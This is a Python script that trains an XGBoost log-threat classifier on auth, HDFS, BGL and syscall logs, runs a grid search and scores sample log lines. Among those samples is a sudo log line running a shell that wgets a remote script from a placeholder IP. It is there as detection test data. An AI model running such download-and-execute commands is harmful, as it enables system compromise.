#!/usr/bin/env python3
"""Train log_threat_v2 — context-aware XGBoost on the LOG-ML-P1 unified CSV.

Usage (from backend/):  uv run python ../scripts/train_log_model_v2.py
                        [--csv PATH] [--seed 1337] [--benign-ratio 2]

Differences from v1 (scripts/train_log_model_v1.py):
  1. CONTEXT features (see app/services/log_features.py::compute_context):
     HDFS block aggregates, BGL node alert proxies, ADFA syscall statistics,
     auth ip+1h-window burst signals. Computed label-free over the whole CSV
     BEFORE splitting — safe because every context group is contained in a
     single split_key, so no aggregate pools rows across the grouped split.
  2. Balance: benign subsampled to 2x (suspicious+malicious).
  3. Hyperparameter grid search (27 configs) scored by validation macro-F1,
     early stopping patience 10 on the grouped validation set.
Targets: macro-F1 > 0.80, malicious recall > 0.50.
Saves backend/ml/models/log_threat_v2.pkl + log_threat_v2_features.json.
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import itertools
import json
import random
import sys
import time
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
BACKEND_DIR = REPO_ROOT / "backend"
sys.path.insert(0, str(BACKEND_DIR))

import joblib  # noqa: E402
import numpy as np  # noqa: E402
from scipy import sparse  # noqa: E402
from sklearn.metrics import accuracy_score, classification_report, f1_score  # noqa: E402
from xgboost import XGBClassifier  # noqa: E402

from app.services.log_blend import blend_scores  # noqa: E402
from app.services.log_features import (  # noqa: E402
    CONTEXT_FEATURES,
    LABELS,
    LABEL_TO_IDX,
    NUMERIC_FEATURES,
    build_template_counts,
    build_vectorizer,
    compute_context,
    context_group_key,
    extract_features,
    group_split,
    ngram_text,
)
from app.services.log_heuristic import classify_heuristic  # noqa: E402

DEFAULT_CSV = REPO_ROOT / "data" / "datasets" / "log_threat" / "log_threat_unified.csv"
MODELS_DIR = BACKEND_DIR / "ml" / "models"

GRID = {
    "n_estimators": [100, 200, 300],
    "max_depth": [3, 5, 7],
    "learning_rate": [0.05, 0.1, 0.2],
}

EVAL_SAMPLES = [
    {"raw_line": "Failed password for invalid user admin from 203.0.113.7 port 41000 ssh2",
     "context": {"ip_failure_burst": 11, "ip_success_after_failure": 1}, "expected_severity": "high"},
    {"raw_line": "Mar 10 03:12:09 srv-auth01 sshd[4242]: Failed password for root from 198.51.100.9 port 50001 ssh2",
     "context": {"ip_failure_burst": 6}, "expected_severity": "high"},
    {"raw_line": "Mar 10 03:12:44 srv-auth01 sshd[4243]: Accepted password for deploy from 198.51.100.9 port 50002 ssh2",
     "context": {"ip_failure_burst": 11, "ip_success_after_failure": 1, "ip_time_anomaly": 1}, "expected_severity": "medium"},
    {"raw_line": "Jun 14 15:16:01 combo sshd(pam_unix): authentication failure; logname= uid=0 euid=0 tty=NODEVssh ruser= rhost=203.0.113.99",
     "context": {"ip_failure_burst": 4}, "expected_severity": "high"},
    {"raw_line": "Mar 10 04:00:01 srv-auth01 sudo: backup : 3 incorrect password attempts ; TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/systemctl",
     "context": {}, "expected_severity": "high"},
    {"raw_line": "Mar 10 04:00:02 srv-auth01 sudo: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c wget http://203.0.113.5/x.sh",
     "context": {"ip_success_after_failure": 1}, "expected_severity": "medium"},
    {"raw_line": "Mar 10 04:01:00 srv-auth01 su: FAILED SU (to root) backup on pts/2",
     "context": {}, "expected_severity": "high"},
    {"raw_line": "instruction cache parity error corrected",
     "context": {"node_alert_count": 143, "node_alert_types": 4}, "expected_severity": "low"},
    {"raw_line": "PacketResponder 1 for block blk_6678472565712118087 terminating",
     "context": {"block_line_count": 13, "block_anomaly_ratio": 0.0, "block_has_error_keywords": 0,
                 "block_time_span_min": 1.18, "rare_template_ratio": 0.0769, "top_template_min_count": 3},
     "expected_severity": "low"},
    {"raw_line": "Receiving block blk_-3102267849859399193 src: /10.251.215.50:58322 dest: /10.251.215.50:50010",
     "context": {"block_line_count": 8, "block_anomaly_ratio": 0.5, "block_has_error_keywords": 1,
                 "block_time_span_min": 11.97, "rare_template_ratio": 0.625, "top_template_min_count": 0},
     "expected_severity": "high"},
]


def load_csv(path: Path) -> list[dict]:
    with open(path, newline="", encoding="utf-8") as f:
        rows = list(csv.DictReader(f))
    if not rows:
        raise SystemExit(f"empty dataset: {path}")
    return rows


def balance_train(rows: list[dict], benign_ratio: int, rng: random.Random) -> list[dict]:
    by_class: dict[str, list[dict]] = {label: [] for label in LABELS}
    for r in rows:
        by_class[r["label"]].append(r)
    threat_count = len(by_class["suspicious"]) + len(by_class["malicious"])
    cap = min(len(by_class["benign"]), benign_ratio * max(threat_count, 1))
    out = rng.sample(by_class["benign"], cap) + by_class["suspicious"] + by_class["malicious"]
    rng.shuffle(out)
    return out


def _matrix(rows: list[dict], contexts: list[dict], vectorizer, fit: bool = False) -> sparse.csr_matrix:
    texts = [ngram_text(r["raw_line"]) for r in rows]
    text_matrix = vectorizer.fit_transform(texts) if fit else vectorizer.transform(texts)
    numeric_names = NUMERIC_FEATURES + CONTEXT_FEATURES
    numeric = sparse.csr_matrix(
        [[extract_features(r["raw_line"], r["source"], ctx)[n] for n in numeric_names]
         for r, ctx in zip(rows, contexts)],
        dtype=float,
    )
    return sparse.hstack([text_matrix, numeric]).tocsr()


def evaluate_bundle(bundle: dict, samples: list[dict]) -> list[dict]:
    vec = bundle["vectorizer"]
    model = bundle["model"]
    rows = [{"raw_line": s["raw_line"], "source": s.get("source", "")} for s in samples]
    matrix = _matrix(rows, [s.get("context") for s in samples], vec)
    proba = model.predict_proba(matrix)
    results = []
    for sample, probs in zip(samples, proba):
        heur = classify_heuristic(sample["raw_line"])
        ml_threat = float(probs[LABEL_TO_IDX["suspicious"]] + probs[LABEL_TO_IDX["malicious"]])
        blended = blend_scores(heur["severity"], ml_threat)
        results.append({
            "raw_line": sample["raw_line"],
            "context": sample.get("context", {}),
            "expected": sample.get("expected_severity", ""),
            "heuristic": heur["severity"],
            "ml_threat_probability": round(ml_threat, 3),
            "risk_score": blended["risk_score"],
            "severity": blended["severity"],
            "mitre": heur["mitre"],
        })
    return results


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--csv", type=Path, default=DEFAULT_CSV)
    ap.add_argument("--seed", type=int, default=1337)
    ap.add_argument("--benign-ratio", type=int, default=2)
    ap.add_argument("--max-depth", type=int, default=None, help="skip grid: single depth")
    ap.add_argument("--balanced-weights", action="store_true",
                    help="add class-balanced sample weights on top of subsampling "
                         "(off by default: unweighted generalized better in tuning runs)")
    ap.add_argument("--malicious-weight", type=float, default=1.0,
                    help="sample-weight multiplier for the malicious class only "
                         "(mild recall boost; 1.0 = off)")
    args = ap.parse_args()

    rng = random.Random(args.seed)
    t0 = time.time()
    rows = load_csv(args.csv)
    print(f"[data] {len(rows)} rows from {args.csv}", flush=True)

    # context features (label-free; groups ⊆ split keys → no cross-partition pooling)
    template_counts = build_template_counts(rows)
    context_map = compute_context(rows, template_counts)
    row_ctx = [context_map[context_group_key(r["raw_line"], r["source"], r["timestamp"])] for r in rows]
    print(f"[context] {len(context_map)} context groups, {len(CONTEXT_FEATURES)} context features", flush=True)

    keys = [r["split_key"] for r in rows]
    train_keys, val_keys, test_keys = group_split(keys, (0.8, 0.1, 0.1), seed=args.seed)
    part = lambda r: 0 if r["split_key"] in train_keys else 1 if r["split_key"] in val_keys else 2  # noqa: E731
    parts = [part(r) for r in rows]
    train_rows = [r for r, p in zip(rows, parts) if p == 0]
    val_rows = [r for r, p in zip(rows, parts) if p == 1]
    test_rows = [r for r, p in zip(rows, parts) if p == 2]
    train_ctx = [c for c, p in zip(row_ctx, parts) if p == 0]
    val_ctx = [c for c, p in zip(row_ctx, parts) if p == 1]
    test_ctx = [c for c, p in zip(row_ctx, parts) if p == 2]
    print(f"[split] train={len(train_rows)} val={len(val_rows)} test={len(test_rows)} "
          f"(groups: {len(train_keys)}/{len(val_keys)}/{len(test_keys)})", flush=True)
    assert not (train_keys & val_keys or train_keys & test_keys or val_keys & test_keys)

    train_bal = balance_train(train_rows, args.benign_ratio, rng)
    bal_ctx = [context_map[context_group_key(r["raw_line"], r["source"], r["timestamp"])] for r in train_bal]
    print(f"[balance] train {len(train_rows)} -> {len(train_bal)} "
          f"({dict(Counter(r['label'] for r in train_bal))})", flush=True)

    vectorizer = build_vectorizer()
    X_train = _matrix(train_bal, bal_ctx, vectorizer, fit=True)
    y_train = np.array([LABEL_TO_IDX[r["label"]] for r in train_bal])
    X_val = _matrix(val_rows, val_ctx, vectorizer)
    y_val = np.array([LABEL_TO_IDX[r["label"]] for r in val_rows])
    X_test = _matrix(test_rows, test_ctx, vectorizer)
    y_test = np.array([LABEL_TO_IDX[r["label"]] for r in test_rows])
    n_features = X_train.shape[1]
    print(f"[features] {n_features} ({len(vectorizer.get_feature_names_out())} text + "
          f"{len(NUMERIC_FEATURES)} numeric + {len(CONTEXT_FEATURES)} context)", flush=True)

    # sample weights: opt-in full balancing, or a mild malicious-only multiplier
    sample_w = None
    if args.balanced_weights:
        class_counts = np.bincount(y_train, minlength=3)
        class_w = class_counts.sum() / (3 * np.maximum(class_counts, 1))
        sample_w = class_w[y_train]
        print(f"[weights] class_counts={class_counts.tolist()} weights={np.round(class_w, 3).tolist()}", flush=True)
    elif args.malicious_weight != 1.0:
        base = np.array([1.0, 1.0, args.malicious_weight])
        sample_w = base[y_train]
        print(f"[weights] malicious_weight={args.malicious_weight}", flush=True)

    # grid search scored by validation macro-F1 (early stopping patience 10)
    depths = [args.max_depth] if args.max_depth else GRID["max_depth"]
    combos = list(itertools.product(GRID["n_estimators"], depths, GRID["learning_rate"]))
    best = None
    for i, (n_est, depth, lr) in enumerate(combos, 1):
        model = XGBClassifier(
            objective="multi:softprob", num_class=3, eval_metric="mlogloss",
            tree_method="hist", n_estimators=n_est, max_depth=depth, learning_rate=lr,
            subsample=0.9, colsample_bytree=0.8, early_stopping_rounds=10,
            random_state=args.seed, n_jobs=-1,
        )
        model.fit(X_train, y_train, eval_set=[(X_val, y_val)], sample_weight=sample_w, verbose=False)
        val_f1 = f1_score(y_val, model.predict(X_val), average="macro", zero_division=0)
        print(f"[grid {i:02d}/{len(combos)}] n={n_est} depth={depth} lr={lr} "
              f"val_macro_f1={val_f1:.4f} (iter={model.best_iteration})", flush=True)
        if best is None or val_f1 > best["val_f1"]:
            best = {"val_f1": val_f1, "n_estimators": n_est, "max_depth": depth,
                    "learning_rate": lr, "best_iteration": int(model.best_iteration),
                    "model": model}
    print(f"[grid] best: n={best['n_estimators']} depth={best['max_depth']} "
          f"lr={best['learning_rate']} val_macro_f1={best['val_f1']:.4f}", flush=True)

    model = best["model"]
    y_pred = model.predict(X_test)
    acc = accuracy_score(y_test, y_pred)
    macro_f1 = f1_score(y_test, y_pred, average="macro")
    report = classification_report(y_test, y_pred, target_names=LABELS, output_dict=True, zero_division=0)
    print(f"[metrics] accuracy={acc:.4f} macro_f1={macro_f1:.4f}")
    for label in LABELS:
        m = report[label]
        print(f"  {label:10s} precision={m['precision']:.3f} recall={m['recall']:.3f} "
              f"f1={m['f1-score']:.3f} support={int(m['support'])}")
    mal_recall = report["malicious"]["recall"]
    ok = macro_f1 > 0.80 and mal_recall > 0.50
    print(f"[targets] macro_f1>0.80: {macro_f1 > 0.80} | malicious_recall>0.50: {mal_recall > 0.50}")

    print("[eval-samples]")
    sample_results = evaluate_bundle(
        {"vectorizer": vectorizer, "model": model},
        [{**s, "source": s.get("source", "")} for s in EVAL_SAMPLES],
    )
    matches = sum(1 for s in sample_results if s["severity"] == s["expected"])
    for s in sample_results:
        print(f"  exp={s['expected'] or '-':6s} got={s['severity']:8s} risk={s['risk_score']:3d} "
              f"heur={s['heuristic']:8s} ml={s['ml_threat_probability']:.2f} ctx={bool(s['context'])} "
              f"{s['raw_line'][:64]}")
    print(f"  exact severity matches: {matches}/{len(sample_results)}")

    MODELS_DIR.mkdir(exist_ok=True)
    pkl_path = MODELS_DIR / "log_threat_v2.pkl"
    manifest_path = MODELS_DIR / "log_threat_v2_features.json"
    bundle = {
        "version": "log_threat_v2",
        "labels": LABELS,
        "model": model,
        "vectorizer": vectorizer,
        "numeric_features": NUMERIC_FEATURES,
        "context_features": CONTEXT_FEATURES,
    }
    joblib.dump(bundle, pkl_path, compress=3)
    manifest = {
        "version": "log_threat_v2",
        "trained_at": datetime.now(timezone.utc).isoformat(),
        "csv_path": str(args.csv),
        "csv_sha256": hashlib.sha256(args.csv.read_bytes()).hexdigest(),
        "seed": args.seed,
        "balance": f"benign subsampled to {args.benign_ratio}x threats"
                   + (" + class-balanced sample weights" if args.balanced_weights else ""),
        "split": {"ratios": [0.8, 0.1, 0.1], "key": "split_key", "grouped": True},
        "context": {
            "n_context_groups": len(context_map),
            "context_feature_names": CONTEXT_FEATURES,
            "computation": "label-free aggregates over context groups "
                           "(HDFS block / BGL node / ADFA trace / auth ip+1h window); "
                           "groups are subsets of split keys",
        },
        "n_features_total": n_features,
        "n_text_features": int(len(vectorizer.get_feature_names_out())),
        "n_numeric_features": len(NUMERIC_FEATURES),
        "n_context_features": len(CONTEXT_FEATURES),
        "vectorizer_params": {"ngram_range": [1, 2], "max_features": 10000, "min_df": 2},
        "labels": LABELS,
        "grid_search": {
            "grid": GRID,
            "n_configs": len(combos),
            "best_params": {k: best[k] for k in ("n_estimators", "max_depth", "learning_rate", "best_iteration")},
            "best_val_macro_f1": round(float(best["val_f1"]), 4),
            "scoring": "validation macro-F1, early_stopping_rounds=10",
        },
        "metrics": {
            "accuracy": round(float(acc), 4),
            "macro_f1": round(float(macro_f1), 4),
            "malicious_recall": round(float(mal_recall), 4),
            "targets_met": bool(ok),
            "per_class": {k: {m: round(float(v), 4) for m, v in report[k].items() if isinstance(v, (int, float))}
                          for k in LABELS},
        },
        "eval_samples_exact_matches": f"{matches}/{len(sample_results)}",
        "sizes": {"train": len(train_bal), "val": len(val_rows), "test": len(test_rows)},
    }
    manifest_path.write_text(json.dumps(manifest, indent=2))
    print(f"[save] {pkl_path} ({pkl_path.stat().st_size / 1e6:.1f} MB), manifest {manifest_path}")
    print(f"[done] {time.time() - t0:.0f}s")


if __name__ == "__main__":
    main()
